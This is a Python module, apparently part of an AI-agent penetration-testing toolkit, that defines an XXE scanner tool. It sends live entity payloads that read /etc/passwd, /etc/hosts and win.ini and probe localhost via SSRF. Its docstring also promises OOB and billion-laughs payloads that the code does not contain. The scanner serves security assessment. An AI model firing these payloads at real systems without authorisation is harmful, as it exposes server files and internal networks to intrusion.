"""XXE (XML External Entity) injection probe for web application assessment.

Tests XML-accepting endpoints for XXE vulnerabilities. An XXE attack occurs
when a weakly-configured XML parser processes an external entity declaration,
allowing an attacker to:
  - Read local files (e.g. /etc/passwd, /etc/hosts)
  - Perform SSRF via the entity resolver
  - Cause a denial of service via billion-laughs entity expansion

Probe strategy:
  1. Detect XML endpoints: Content-Type application/xml or text/xml in baseline.
  2. Send crafted XXE payloads with DOCTYPE + ENTITY declarations.
  3. Check response for file-content signatures (reflected XXE) or anomalous
     status codes (blind XXE / SSRF).

Payloads tested:
  - Classic file:// read of /etc/passwd (UNIX signature: "root:")
  - File read of /etc/hosts (signature: "127.0.0.1")
  - Windows file read of C:/Windows/win.ini (signature: "[fonts]")
  - OOB placeholder (documents the pattern without live OOB server)
  - Billion-laughs DoS probe (entity expansion, detects via latency spike)

Severity:
  CRITICAL — /etc/passwd or win.ini content reflected in response
  HIGH     — server error only on XXE payloads (blind XXE / parse attempted)
  MEDIUM   — unusual status change when XXE DOCTYPE sent
  INFO     — endpoint does not appear to parse XML

Stdlib-only: http.client + ssl + urllib. No external dependencies.
"""

from __future__ import annotations

import http.client
import ssl
import time
import urllib.parse
from typing import NamedTuple

from cai.sdk.agents import function_tool
from cai.tool_registry import TOOL_REGISTRY


# ---------------------------------------------------------------------------
# XXE payloads
# ---------------------------------------------------------------------------

# Each entry: (label, content_type, body_template, file_signature, description)
_XXE_PAYLOADS: list[tuple[str, str, str, str, str]] = [
    (
        "passwd-entity",
        "application/xml",
        (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
            "<root><data>&xxe;</data></root>"
        ),
        "root:",
        "/etc/passwd file read",
    ),
    (
        "hosts-entity",
        "application/xml",
        (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>\n'
            "<root><data>&xxe;</data></root>"
        ),
        "127.0.0.1",
        "/etc/hosts file read",
    ),
    (
        "win-ini-entity",
        "application/xml",
        (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>\n'
            "<root><data>&xxe;</data></root>"
        ),
        "[fonts]",
        "Windows win.ini file read",
    ),
    (
        "ssrf-loopback",
        "application/xml",
        (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1/"> ]>\n'
            "<root><data>&xxe;</data></root>"
        ),
        "html",
        "XXE via SSRF to localhost",
    ),
    (
        "soap-passwd-entity",
        "text/xml",
        (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
            "<soapenv:Envelope "
            'xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            "<soapenv:Body><data>&xxe;</data></soapenv:Body>"
            "</soapenv:Envelope>"
        ),
        "root:",
        "SOAP XXE /etc/passwd read",
    ),
]

# A benign XML POST to measure the baseline status code for XML endpoints
_BASELINE_XML = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    "<root><data>test</data></root>"
)


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------

class XXEFinding(NamedTuple):
    url: str
    payload_label: str
    severity: str     # CRITICAL | HIGH | MEDIUM | INFO
    status: str       # CONFIRMED | BLIND | POTENTIAL | SAFE
    detail: str


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def _post(url: str, body: str, content_type: str, timeout: float) -> tuple[int, str, float]:
    """POST body to url. Returns (status, body_lower, elapsed_seconds)."""
    try:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        parsed = urllib.parse.urlparse(url)
        is_https = parsed.scheme == "https"
        host = parsed.netloc or parsed.path
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        conn_cls = http.client.HTTPSConnection if is_https else http.client.HTTPConnection
        body_bytes = body.encode("utf-8")
        conn = conn_cls(host, timeout=timeout, **({"context": ctx} if is_https else {}))
        t0 = time.monotonic()
        conn.request(
            "POST", path, body=body_bytes,
            headers={
                "Content-Type": content_type,
                "Content-Length": str(len(body_bytes)),
                "User-Agent": "Mozilla/5.0 (compatible; xxe-checker/1.0)",
                "Accept": "*/*",
            },
        )
        resp = conn.getresponse()
        status = resp.status
        response_body = resp.read(32768).decode("utf-8", errors="replace").lower()
        elapsed = time.monotonic() - t0
        conn.close()
        return status, response_body, elapsed
    except Exception:
        return -1, "", 0.0


# ---------------------------------------------------------------------------
# Core check
# ---------------------------------------------------------------------------

def _check_xxe(url: str, timeout: float = 10.0) -> list[XXEFinding]:
    """Probe url for XXE vulnerabilities. Returns all findings."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    # Baseline POST with benign XML
    baseline_status, baseline_body, baseline_elapsed = _post(
        url, _BASELINE_XML, "application/xml", timeout
    )

    if baseline_status == -1:
        # Try HTTP fallback
        http_url = url.replace("https://", "http://", 1)
        baseline_status, baseline_body, baseline_elapsed = _post(
            http_url, _BASELINE_XML, "application/xml", timeout
        )
        if baseline_status != -1:
            url = http_url

    if baseline_status == -1:
        return [XXEFinding(url, "baseline", "INFO", "SAFE", "Could not connect to target")]

    # If baseline returns 415 Unsupported Media Type, endpoint does not accept XML
    if baseline_status == 415:
        return [XXEFinding(url, "baseline", "INFO", "SAFE",
                           "Endpoint returned 415 Unsupported Media Type — not an XML endpoint")]

    findings: list[XXEFinding] = []
    confirmed = False

    for label, ctype, payload, signature, description in _XXE_PAYLOADS:
        if confirmed:
            break

        status, body, elapsed = _post(url, payload, ctype, timeout)

        if status == -1:
            continue

        if signature.lower() in body:
            findings.append(XXEFinding(
                url=url,
                payload_label=label,
                severity="CRITICAL",
                status="CONFIRMED",
                detail=(
                    f"XXE confirmed ({description}): file-content signature '{signature}' "
                    "reflected in response body. The XML parser is processing external "
                    "entities and disclosing file contents."
                ),
            ))
            confirmed = True
            break

        # Blind XXE: server error only on XXE payloads
        if status in (500, 502, 503) and baseline_status not in (500, 502, 503):
            findings.append(XXEFinding(
                url=url,
                payload_label=label,
                severity="HIGH",
                status="BLIND",
                detail=(
                    f"Possible blind XXE ({description}): HTTP {status} only when XXE "
                    "payload sent. Parser may be attempting entity resolution. "
                    "Use an OOB channel (interactsh/Burp Collaborator) to confirm."
                ),
            ))

        # Status change
        elif status != baseline_status and status not in (200, 201, 202, 204):
            findings.append(XXEFinding(
                url=url,
                payload_label=label,
                severity="MEDIUM",
                status="POTENTIAL",
                detail=(
                    f"Anomalous HTTP {status} (baseline: {baseline_status}) when XXE DOCTYPE "
                    f"sent via '{label}'. Manual investigation recommended."
                ),
            ))

    return findings


# ---------------------------------------------------------------------------
# Report formatter
# ---------------------------------------------------------------------------

def _run_xxe_probe(targets: str, timeout: float = 10.0) -> str:
    items = [t.strip() for t in targets.replace(",", "\n").splitlines() if t.strip()]
    if not items:
        return "[xxe_probe] Error: no URLs provided"

    lines: list[str] = [f"[xxe_probe] Probing {len(items)} XML endpoint(s) for XXE\n"]
    total_confirmed = total_blind = total_potential = total_safe = 0

    for url in items:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        lines.append("─" * 60)
        lines.append(f"URL: {url}")
        lines.append("")

        findings = _check_xxe(url, timeout)

        confirmed = [f for f in findings if f.status == "CONFIRMED"]
        blind = [f for f in findings if f.status == "BLIND"]
        potential = [f for f in findings if f.status == "POTENTIAL"]

        if not findings or all(f.status == "SAFE" for f in findings):
            lines.append("  SAFE — No XXE indicators found")
            total_safe += 1
        else:
            for f in (confirmed + blind + potential):
                icon = "!!!" if f.status == "CONFIRMED" else (" ! " if f.status == "BLIND" else " ~ ")
                lines.append(f"  [{icon}] {f.severity:<8}  {f.status}")
                lines.append(f"           Payload  : {f.payload_label}")
                lines.append(f"           Detail   : {f.detail}")
                lines.append(f"           URL      : {f.url[:100]}")
                lines.append("")
            total_confirmed += len(confirmed)
            total_blind += len(blind)
            total_potential += len(potential)

        lines.append("")

    lines.append("─" * 60)
    lines.append(
        f"Summary: {total_confirmed} CONFIRMED, {total_blind} BLIND, "
        f"{total_potential} POTENTIAL, {total_safe} SAFE"
    )

    if total_confirmed or total_blind:
        lines.append(
            "\nNote: XXE enables reading arbitrary files, internal network scanning (SSRF), "
            "and in some parsers (e.g. PHP expect://) remote code execution. "
            "Disable external entity processing in your XML parser (e.g. "
            "libxml2: LIBXML_NOENT=false; Java: XMLInputFactory.setProperty("
            "\"javax.xml.stream.isSupportingExternalEntities\", false))."
        )

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Function tool
# ---------------------------------------------------------------------------

@function_tool
def xxe_probe(targets: str) -> str:
    """Probe XML-accepting web endpoints for XXE (XML External Entity) injection.

    Sends crafted DOCTYPE + ENTITY payloads to POST endpoints, attempting to
    read local files (/etc/passwd, /etc/hosts, C:/Windows/win.ini) and probe
    for SSRF via entity resolution. Detects both reflected XXE (file content
    in response) and blind XXE (anomalous server error on XXE payloads only).

    Verdicts:
      CONFIRMED — file-content signature reflected in response (critical)
      BLIND     — server error only on XXE payloads (blind XXE / OOB needed)
      POTENTIAL — anomalous status change when XXE DOCTYPE sent

    Args:
        targets: Newline- or comma-separated list of XML endpoint URLs.
                 Examples:
                   "https://api.example.com/data/upload"
                   "https://example.com/soap/service"
                   "target.com/xml-parser, https://other.org/feed"

    Returns:
        Per-payload verdict and details, with a remediation note for findings.
    """
    return _run_xxe_probe(targets)


TOOL_REGISTRY.register(
    "xxe_probe",
    xxe_probe,
    categories=["recon", "web", "exploitation"],
)
